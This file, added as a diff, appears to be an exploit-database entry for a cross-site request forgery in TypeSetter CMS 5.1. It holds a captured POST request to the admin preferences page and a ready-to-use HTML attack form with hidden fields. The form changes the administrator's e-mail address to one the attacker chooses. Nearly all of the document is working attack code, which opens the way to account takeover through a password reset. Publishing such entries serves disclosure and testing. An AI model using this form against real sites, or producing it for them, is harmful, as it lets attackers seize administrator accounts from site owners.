@@ -1,0 +1,68 @@
+# Exploit Title: TypeSetter 5.1 - CSRF (Change admin e-mail)
+# Exploit Author: Alperen Ergel
+# Software Homepage: https://www.typesettercms.com/
+# Version : 5.1
+# Tested on: Kali & ubuntu
+# Category: WebApp
+
+######## Description ########
+
+Attacker can change admin e-mail address 
+
+## Vulnerable
+
+- Go to the admin page view preferences
+- Change the e-mail address
+
+######## Proof of Concept ########
+
+===> REQUEST <==== 
+POST /typesetter/Admin/Preferences HTTP/1.1
+Host: http://localhost/
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 237
+Origin: http://localhost/
+Connection: close
+Referer: http://localhost/typesetter/Admin/Preferences
+
+## < SNIPP > 
+
+
+verified=6cab21b263dafc079bc056b7e0f0610c37d1a5af46f252e24d537afa906baed776c370cb24709d8795842c0a86eb2d76e4300d529ebb5c0840fd5096c96c748c
+&email=demo%40mail.com&oldpassword=&password=&password1=&algo=password_hash&cmd=changeprefs&aaa=Save
+
+#### Attack Code ####
+
+<html>
+
+  <body>
+
+    <form action="http://localhost/typesetter/Admin/Preferences" method="POST">
+
+      <input type="hidden" name="verified" value="6cab21b263dafc079bc056b7e0f0610c37d1a5af46f252e24d537afa906baed776c370cb24709d8795842c0a86eb2d76e4300d529ebb5c0840fd5096c96c748c" />
+
+      <input type="hidden" name="email" value="[CHANGE HERE]" />
+
+      <input type="hidden" name="oldpassword" value="" />
+
+      <input type="hidden" name="password" value="" />
+
+      <input type="hidden" name="password1" value="" />
+
+      <input type="hidden" name="algo" value="password&#95;hash" />
+
+      <input type="hidden" name="cmd" value="changeprefs" />
+
+      <input type="hidden" name="aaa" value="Save" />
+
+      <input type="submit" value="Submit request" />
+
+    </form>
+
+  </body>
+
+</html>
